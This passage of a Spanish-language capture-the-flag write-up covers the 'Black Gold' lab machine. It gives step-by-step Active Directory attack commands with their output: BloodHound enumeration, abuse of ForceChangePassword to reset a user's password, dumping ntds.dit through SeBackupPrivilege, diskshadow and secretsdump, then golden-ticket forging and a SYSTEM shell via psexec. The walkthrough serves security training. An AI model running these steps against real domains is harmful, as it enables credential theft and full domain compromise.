HTTP        192.168.56.10   5985   DC01             [*] http://192.168.56.10:5985/wsman
WINRM       192.168.56.10   5985   DC01             [+] neptune.thl\emma.johnson:************* (Pwn3d!)
```
Excelente, las podemos usar.

-----------------
**IMPORTANTE**

Antes de loguearnos en la máquina con las credenciales del **usuario emma.johnson**, vamos a usar **bloodhound-python** para obtener la data del AD que usaremos en **BloodHound**.

Esto lo hacemos, ya que existen permisos que tiene el **usuario emma.johnson** que, por alguna razón, se eliminan una vez que entras por **evil-winrm** a la máquina.

Más adelante, veremos qué permisos son.

Obtengamos la data:
```bash
bloodhound-python -u 'emma.johnson' -p 'contraseña_emma.johnson' -d neptune.thl -dc DC01.neptune.thl -ns 192.168.56.10 --zip -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: neptune.thl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC01.neptune.thl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC01.neptune.thl
INFO: Found 8 users
INFO: Found 53 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.neptune.thl
INFO: Done in 00M 01S
INFO: Compressing output into 20250513020845_bloodhound.zip
```
Listo.

-----------------

Ahora sí, entremos a la máquina:
```batch
evil-winrm -i 192.168.56.10 -u 'emma.johnson' -p '***********'
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
.
*Evil-WinRM* PS C:\Users\Emma Johnson\Documents>
```

Y en el Escritorio encontramos la flag del usuario:
```batch
*Evil-WinRM* PS C:\Users\Emma Johnson\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> type user.txt
...
```

## Post Explotación {#Post}

### Enumeración de AD con BloodHound {#BloodHound}

Si revisamos los privilegios de **emma.johnson**, no tendrá alguno que nos pueda ayudar:
```batch
*Evil-WinRM* PS C:\Users\Emma Johnson\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Entonces, vamos directamente a revisar la data del AD en **BloodHound**.

Primero, marquemos los usuarios de los que somos dueños y revisemos su información.

Si te diste cuenta, ninguno de los que tenemos tiene algo que nos ayude en algo, a excepción del usuario **emma.johnson**.

Viendo su información, casi al final encontramos el **nodo Outbound Object Control**. Observa que este usuario tiene la capacidad de modificar 1 objeto del **First Degree Object Control**.

Dándole click, nos mostrará esto:

<p align="center">
<img src="/assets/images/THL-writeup-blackGold/Captura8.png">
</p>

Parece que tenemos el permiso **ForceChangePassword**.

------------
**NOTA**
Este es el permiso que deberías encontrar.

En caso de que no lo tenga el usuario **emma.johnson**, deberás eliminar y volver a instalar la **máquina Black Gold**.

Hazlo, hasta que encuentres ese permiso. Si no, no podrás avanzar.

-----------

### Abusando de Permiso ForceChangePassword {#ForceChangePassword}

Investiguemos qué es:

| **Permiso ForceChangePassword** |
|:-----------:|
| *En BloodHound, ForceChangePassword aparece como una relación de control entre objetos. Indica que un usuario puede establecer el flag "must change password at next logon" sobre otro usuario. ForceChangePassword puede facilitar un ataque de escalamiento de privilegios, si el atacante logra cambiar la contraseña de la víctima (GenericWrite, ResetPassword, etc.)* |

Muy bien, entonces tenemos la capacidad de cambiarle la contraseña al **usuario thomas.brown** y **BloodHound** lo menciona:

<p align="center">
<img src="/assets/images/THL-writeup-blackGold/Captura9.png">
</p>

Tenemos dos formas de abusar de este permiso, ya sea de manera local dentro de la **máquina Windows** o de manera remota desde nuestro Kali.

Apliquemos ambas.

#### Abusando de Permiso ForceChangePassword de Manera Local {#ForceChangePassword1}

Para realizar esto, necesitamos de la herramienta **PowerView.ps1**, que puedes descargar aquí:
* <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank">Repositorio de PowerShellMafia: PowerView.ps1</a>

Lo puedes descargar con **wget**:
```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1
```

Una vez que lo tengas, cárgalo a la sesión de **evil-winrm**:
```batch
*Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> upload powerview.ps1
Info: Uploading /../TheHackersLabs/BlackGold/content/powerview.ps1 to C:\Users\Emma Johnson\Desktop\PowerView.ps1
Data: 1217440 bytes of 1217440 bytes copied
Info: Upload successful!
.
*Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> Import-Module .\PowerView.ps1
```

Ahora, debemos seguir los pasos que nos indica **BloodHound**:

<p align="center">
<img src="/assets/images/THL-writeup-blackGold/Captura10.png">
</p>

Apliquémoslos:
```batch
*Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> $SecPassword = ConvertTo-SecureString 'contraseña_emma.johnson' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> $Cred = New-Object System.Management.Automation.PSCredential('neptune.thl\emma.johnson', $SecPassword)
*Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> $UserPassword = ConvertTo-SecureString 'Hackeado123!' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\Emma Johnson\Desktop> Set-DomainUserPassword -Identity thomas.brown -AccountPassword $UserPassword -Credential $Cred
```

Analicemos lo que hicimos:

* El primer comando convierte la contraseña de **emma.johnson** en un objeto **SecureString**, que es requerido por muchos cmdlets que manejan contraseñas de forma segura.
* El segundo comando crea un objeto **PSCredential** que almacena el nombre de usuario `'neptune.thl\emma.johnson'` y la contraseña `$SecPassword` (ya convertida a **SecureString**)
* El tercer comando crea otra contraseña en formato **SecureString** con el valor `'Hackeado123!'`, que será la nueva contraseña para el **usuario thomas.brown**.
* El cuarto comando le dice a **PowerShell** (con la ayuda de **PowerView**) que, cambie la contraseña del **usuario thomas.brown**, establezca como nueva contraseña `Hackeado123!` y se las credenciales de **emma.johnson** para hacerlo (`-Credential $Cred`).

Podemos comprobar que funcionó el cambio con **netexec**:
```bash
netexec winrm 192.168.56.10 -u 'thomas.brown' -p 'Hackeado123!'
WINRM       192.168.56.10   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:neptune.thl)
WINRM       192.168.56.10   5985   DC01             [+] neptune.thl\thomas.brown:Hackeado123! (Pwn3d!)
```
Genial.

Ya solo nos logueamos en una nueva sesión de **evil-winrm** usando al **usuario thomas.brown**:
```batch
evil-winrm -i 192.168.56.10 -u 'thomas.brown' -p 'Hackeado123!'
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
.
*Evil-WinRM* PS C:\Users\thomas.brown\Documents> whoami
neptune\thomas.brown
```

#### Abusando de Permiso ForceChangePassword de Manera Externa {#ForceChangePassword2}

Veamos las instrucciones de **BloodHound**:

<p align="center">
<img src="/assets/images/THL-writeup-blackGold/Captura11.png">
</p>

Necesitamos utilizar la herramienta **net** que es de **Samba** para poder cambiar la contraseña del usuario.

Únicamente copiamos el comando en nuestro kali y lo modificamos para agregar la contraseña de **emma.johnson**:
```bash
net rpc password "thomas.brown" "newP@ssword2022" -U "neptune.thl"/"emma.johnson"%"contraseña_emma.johnson" -S "192.168.56.10"
```
Listo.

Comprobemos si funcionó con **netexec**:
```bash
netexec winrm 192.168.56.10 -u 'thomas.brown' -p 'newP@ssword2022' 
WINRM       192.168.56.10   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:neptune.thl)
WINRM       192.168.56.10   5985   DC01             [+] neptune.thl\thomas.brown:newP@ssword2022 (Pwn3d!)
```

Ahora nos logueamos como este usuario:
```batch
evil-winrm -i 192.168.56.10 -u 'thomas.brown' -p 'Hackeado123!'
Evil-WinRM shell v3.7
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
.
*Evil-WinRM* PS C:\Users\thomas.brown\Documents> whoami
neptune\thomas.brown
```
Estamos dentro.

### Abusando de Privilegio SeBackupPrivilege para Dumpear Hashes de Archivo ntds.dit {#Privesc}

Si revisamos los privilegios de este usuario, descubrimos que tiene el privilegio **SeBackupPrivilege**:
```batch
*Evil-WinRM* PS C:\Users\thomas.brown\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

E incluso, lo podemos ver en **BloodHound**, ya que este usuario pertenece al **grupo Backup Operators**:

<p align="center">
<img src="/assets/images/THL-writeup-blackGold/Captura12.png">
</p>

Investiguemos este privilegio:

| **Privilegio SeBackupPrivilege** |
|:-----------:|
| *El privilegio SeBackupPrivilege es un permiso especial en sistemas Windows que permite a un usuario o proceso leer cualquier archivo en el sistema, incluso si las ACLs (Listas de Control de Acceso) normales no se lo permiten.* |

Buscando por ahí, encontramos el siguiente blog que nos muestra dos métodos que podemos usar para escalar privilegios, si nuestro usuario tiene los privilegios **SeBackupPrivilege y SeRestorePrivilege**:
* <a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" target="_blank">Windows Privilege Escalation: SeBackupPrivilege</a>

Resumiendo un poco el artículo, la idea es aprovecharnos de estos privilegios para poder extraer los hashes del **archivo ntds.dit** realizando copias de este archivo y del archivo **System Hive** de la máquina.

El problema aquí es que el **archivo ntds.dit** está en uso, lo que nos complica el poder copiarlo, pues dicho archivo permanece bloqueado por el SO para prevenir su acceso directo.

Para aplicar un bypass a esto, necesitamos usar la función **diskshadow** y un archivo **Distributed Shell (DSH)**:

| **diskshadow.exe** |
|:-----------:|
| *diskshadow.exe es una herramienta de línea de comandos que permite a los administradores (o atacantes con privilegios) crear y gestionar instantáneas de volumen (shadow copies). Estas instantáneas son copias "congeladas" del estado de un disco en un momento determinado, y se utilizan comúnmente para backups del sistema, recuperación de datos sin detener procesos en ejecución y Acceso a archivos que están normalmente bloqueados o protegidos, como NTDS.dit, SAM, o SYSTEM* |

| **Archivo Distributed Shell (DSH)** |
|:-----------:|
| *diskshadow usa archivos de texto plano (.txt) llamados comúnmente scripts de diskshadow, que contienen comandos que automatizan la creación y exposición de instantáneas (shadow copies).* |

Vamos a crear el **archivo DSH**:
```bash
nano berserk.dsh
---------
set context persistent nowriters
add volume c: alias berserk
create
expose %berserk% z:
```
Puedes modificar los nombres berserk para que esté tu alias.

Ahora, tenemos que usar la herramienta **unix2dos** sobre nuestro **archivo DSH**, pues convierte la codificación y el espaciado del **archivo DSH** a un formato compatible con la **máquina Windows**, lo que garantiza una ejecución sin problemas.
```bash
unix2dos berserk.dsh
unix2dos: convirtiendo archivo berserk.dsh a formato DOS..
```
Listo.

Apliquemos ambos métodos.

#### Metodo 1: Copiando Archivo ntds.dit con diskshadow y SYSTEM con reg save {#Hashes1}

Crea un directorio temporal y carga el **archivo DSH** a la sesión de **evil-winrm**:
```batch
*Evil-WinRM* PS C:\Users\thomas.brown\Documents> cd C:\
*Evil-WinRM* PS C:\> mkdir Temp
*Evil-WinRM* PS C:\Temp> upload berserk.dsh
Info: Uploading /../TheHackersLabs/BlackGold/content/berserk.dsh to C:\Temp\berserk.dsh
Data: 120 bytes of 120 bytes copied
Info: Upload successful!
```

Ejecuta el **archivo DSH** con **diskshadow**:
```batch
*Evil-WinRM* PS C:\Temp> diskshadow /s berserk.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  5/15/2025 5:21:46 AM

-> set context persistent nowriters
-> add volume c: alias berserk
-> create
Alias berserk for shadow ID {5c1763ce-df77-4fb5-87b4-751afe688ffa} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {24ff74c8-8965-450d-8d1f-5ffc00373b3b} set as environment variable.

Querying all shadow copies with the shadow copy set ID {24ff74c8-8965-450d-8d1f-5ffc00373b3b}

	* Shadow copy ID = {5c1763ce-df77-4fb5-87b4-751afe688ffa}		%berserk%
		- Shadow copy set: {24ff74c8-8965-450d-8d1f-5ffc00373b3b}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{c2f9909f-0000-0000-0000-100000000000}\ [C:\]
		- Creation time: 5/15/2025 5:21:47 AM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
		- Originating machine: DC01.neptune.thl
		- Service machine: DC01.neptune.thl
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %berserk% z:
-> %berserk% = {5c1763ce-df77-4fb5-87b4-751afe688ffa}
The  drive letter is already in use.
```
Observa que se ejecutan los comandos que metimos en el **archivo DSH**. Esto creó la copia del **Disco C** dentro del **Disco Z**, indicado en el **archivo DSH**.

Ahora, copia el **archivo ntds.dit** del **Disco Z** con la herramienta **robocopy**:
```batch
*Evil-WinRM* PS C:\Temp> robocopy /b z:\windows\ntds . ntds.dit
.
-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------
...
 99.6%
100%
100%
...
   Speed :           26,504,290 Bytes/sec.
   Speed :            1,516.588 MegaBytes/min.
```

Ya solo falta copiar el **archivo System Hive** con **reg save**:
```batch
*Evil-WinRM* PS C:\Temp> reg save hklm\system c:\Temp\system
The operation completed successfully.
```

Podemos revisar que existen los **archivos ntds.dit y system**:
```batch
*Evil-WinRM* PS C:\Temp> dir
.
    Directory: C:\Temp
.
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/15/2025   5:21 AM            614 2025-05-15_5-21-48_DC01.cab
-a----         5/15/2025   3:35 AM             92 berserk.dsh
-a----         2/26/2025   8:31 PM       16777216 ntds.dit
-a----         5/15/2025   5:23 AM       15773696 system
```

Descarga estos dos archivos:
```batch
*Evil-WinRM* PS C:\Temp> download system
Info: Downloading C:\Temp\system to system
Info: Download successful!
*Evil-WinRM* PS C:\Temp> download ntds.dit
Info: Downloading C:\Temp\ntds.dit to ntds.dit
Info: Download successful!
```

Y con la herramienta **impacket-secretsdump**, dumpeamos todos los hashes del **archivo ntds.dit y system hive**:
```bash
impacket-secretsdump -ntds ntds.dit -system system local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x9a6eda47674d4ed68313ddc1c8f9ca5b
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 5e8a0e9e33e9b3e49f0767e39f3e7d29
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b43......
.....
.....
.....
```

#### Metodo 2: Copiando Archivos ntds.dit y SYSTEM Usando Archivos DLL {#Hashes2}

Para este método, necesitamos dos **archivos DLL** que nos ayudan a crear backups del **archivo ntds.dit y system**.

Estos los puedes descargar del siguiente repositorio (se encuentran al casi al final):
* <a href="https://github.com/giuliano108/SeBackupPrivilege?tab=readme-ov-file" target="_blank">Repositorio de giuliano108: SeBackupPrivilege</a>

Una vez que los descargues, cárgalos a la sesión de **evil-winrm** y también el **archivo DSH**:
```batch
*Evil-WinRM* PS C:\Temp> upload SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Temp> upload SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\Temp> upload berserk.dsh
```

Importa los dos **archivos DLL** a la sesión:
```batch
*Evil-WinRM* PS C:\Temp> Import-Module .\SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\Temp> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

Ejecuta el **archivo DSH** con **diskshadow**:
```batch
*Evil-WinRM* PS C:\Temp> diskshadow /s berserk.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  5/15/2025 5:49:36 AM

-> set context persistent nowriters
-> add volume c: alias berserk
-> create
Alias berserk for shadow ID {17343110-dc4e-4cdb-85e9-fd0d35943e06} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {a13ee0f8-6585-4e73-9e13-7696e6b73474} set as environment variable.

Querying all shadow copies with the shadow copy set ID {a13ee0f8-6585-4e73-9e13-7696e6b73474}

	* Shadow copy ID = {17343110-dc4e-4cdb-85e9-fd0d35943e06}		%berserk%
		- Shadow copy set: {a13ee0f8-6585-4e73-9e13-7696e6b73474}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{c2f9909f-0000-0000-0000-100000000000}\ [C:\]
		- Creation time: 5/15/2025 5:49:37 AM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3
		- Originating machine: DC01.neptune.thl
		- Service machine: DC01.neptune.thl
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %berserk% z:
-> %berserk% = {17343110-dc4e-4cdb-85e9-fd0d35943e06}
The  drive letter is already in use.
```

Ahora, usamos el **cmdlet Copy-FileSebackupPrivilege**, que es parte de los **archivos DLL** que importamos antes, para copiar el **archivo ntds.dit**:
```batch
*Evil-WinRM* PS C:\Temp> Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
```

Ya solo falta copiar el **archivo System Hive** con **reg save**:
```batch
*Evil-WinRM* PS C:\Temp> reg save hklm\system c:\Temp\system
The operation completed successfully.
```

Puedes revisar que ya tenemos el **archivo ntds.dit y el system hive**:
```batch
*Evil-WinRM* PS C:\Temp> dir
.
    Directory: C:\Temp
.
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/15/2025   5:49 AM            613 2025-05-15_5-49-37_DC01.cab
-a----         5/15/2025   3:35 AM             92 berserk.dsh
-a----         5/15/2025   5:52 AM       16777216 ntds.dit
-a----         5/15/2025   5:47 AM          12288 SeBackupPrivilegeCmdLets.dll
-a----         5/15/2025   5:47 AM          16384 SeBackupPrivilegeUtils.dll
-a----         5/15/2025   5:52 AM       15773696 system
```

Descarga estos dos archivos:
```batch
*Evil-WinRM* PS C:\Temp> download system
Info: Downloading C:\Temp\system to system
Info: Download successful!
*Evil-WinRM* PS C:\Temp> download ntds.dit
Info: Downloading C:\Temp\ntds.dit to ntds.dit
Info: Download successful!
```

Y con la herramienta **impacket-secretsdump**, volvemos a dumpear todos los hashes del **archivo ntds.dit y system hive**:
```bash
impacket-secretsdump -ntds ntds.dit -system system local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x9a6eda47674d4ed68313ddc1c8f9ca5b
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 5e8a0e9e33e9b3e49f0767e39f3e7d29
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b43......
.....
.....
.....
```

Comprobemos que funciona el **Hash del Administrador** con **crackmapexec**:
```bash
crackmapexec smb 192.168.56.10 -u 'Administrator' -H 'Hash_NTLM o Hash NT'
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False)
SMB         192.168.56.10   445    DC01             [-] neptune.thl\Administrator:*********** STATUS_LOGON_FAILURE
```
Parece que el Hash no está funcionando, posiblemente hay alguna regla que esté impidiendo que utilicemos el **Hash del Administrador**, lo que nos impedirá loguearnos en la máquina víctima aplicando **Pass-The-Hash**.

Podemos aplicar el **Golden Ticket Attack**, para suplantar al **Administrador** y evadir cualquier restricción que nos esté bloqueando.

### Creando Golden Ticket para Autenticarnos Vía Kerberos como Administrador {#GoldenTicket}

¿Qué es el **Golden Ticket Attack**?

| **Golden Ticket Attack** |
|:-----------:|
| *El Golden Ticket Attack es una técnica avanzada de post-explotación que permite a un atacante crear un ticket Kerberos TGT (Ticket Granting Ticket) falso y utilizarlo para obtener acceso ilimitado a recursos dentro de un dominio Active Directory.* |

Para crear el **Golden Ticket**, necesitamos lo siguiente:
* La herramienta **impacket-ticketer**.
* El **SID** del dominio.
* El **Hash NT** de quien vamos a suplantar.

El **SID** del dominio, lo podemos obtener con la herramienta **impacket-getPac**:
```bash
impacket-getPac -targetUser 'thomas.brown' neptune.thl/'thomas.brown:newP@ssword2022'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
...
...
ResourceGroupIds:                NULL 
Domain SID: S-1-5-21-4221554869-2967981397-3876651103
```
Y como ya tenemos el **Hash NT** del administrador, ya solamente tenemos que agregar lo demás.

A la herramienta **impacket-ticketer**, le indicamos el **Hash NT** (`-nthash`), el usuario a suplantar (`-user`), el grupo al que pertenece el usuario que sería 500 para el administrador (`groups`), el **SID** del dominio (`-domain-sid`), el dominio (`-domain`), la IP de la máquina (`-dc-ip`) y el objetivo que es el **Administrator**:
```bash
impacket-ticketer -nthash 'Hash_NT_de_Administador' -user 'Administrator' -groups 500 -domain-sid 'S-1-5-21-4221554869-2967981397-3876651103' -domain neptune.thl -dc-ip 192.168.56.10 Administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
.
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for neptune.thl/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in Administrator.ccache
```
Ya tenemos el archivo **Administrator.ccache**.

Tenemos que exportarlo como variable de entorno:
```bash
export KRB5CCNAME=Administrator.ccache
```

Podemos comprobar que ya está cargado el archivo **Administrator.ccache** como variable de entorno con la herramienta **klist**:
```bash
klist
Ticket cache: FILE:Administrator.ccache
Default principal: Administrator@NEPTUNE.THL

Valid starting     Expires            Service principal
15/05/25 00:12:39  13/05/35 00:12:39  krbtgt/NEPTUNE.THL@NEPTUNE.THL
	renew until 13/05/35 00:12:39
```
Excelente, ya está cargado.

Y antes de usar **impacket-psexec** para entrar a la máquina, tenemos que revisar un par de cosillas.

Primero, que el dominio esté bien registrado en el `/etc/hosts`:
```bash
nano /etc/hosts
---------------
192.168.56.10 neptune.thl DC01.neptune.thl
```

Configuramos temporalmente un **DNS** para el DC de la máquina víctima en el archivo `/etc/resolv.conf`:
```bash
nano /etc/resolv.conf
--------------------
nameserver 192.168.56.10
```

Y nos ponemos temporalmente en el mismo horario que esté la máquina víctima con la herramienta **ntpdate**:
```bash
ntpdate -u DC01.neptune.thl
2025-05-15 03:15:33.559101 (-0600) +326.476510 +/- 0.000732 DC01.neptune.thl 192.168.56.10 s1 no-leap
CLOCK: time stepped by 326.476510
```

Si todo está bien configurado, si usas **nslookup** para probar el DNS del DC, nos tendría que resolver y mostrar su información:
```bash
nslookup DC01.neptune.thl
Server:         192.168.56.10
Address:        192.168.56.10#53

Name:   DC01.neptune.thl
Address: 192.168.56.10
```

Ya con todo esto, nos logueamos en la máquina víctima con **impacket-psexec**, indicándole que será por **Kerberos** (`-k`), sin contraseña (`-no-pass`), el dominio y el usuario junto al nombre del servidor DC:
```batch
impacket-psexec -k -no-pass neptune.thl/Administrator@DC01.neptune.thl
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC01.neptune.thl.....
[*] Found writable share ADMIN$
[*] Uploading file XZzsOXdt.exe
[*] Opening SVCManager on DC01.neptune.thl.....
[*] Creating service XFYR on DC01.neptune.thl.....
[*] Starting service XFYR.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.587]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> 

C:\Windows\system32> whoami
nt authority\system
```
Funcionó correctamente.

Busca la última flag que nos falta:
```batch
C:\> cd Users\Administrator\Desktop
.
C:\Users\Administrator\Desktop> type root.txt
...
```
Y con esto, terminamos la máquina.
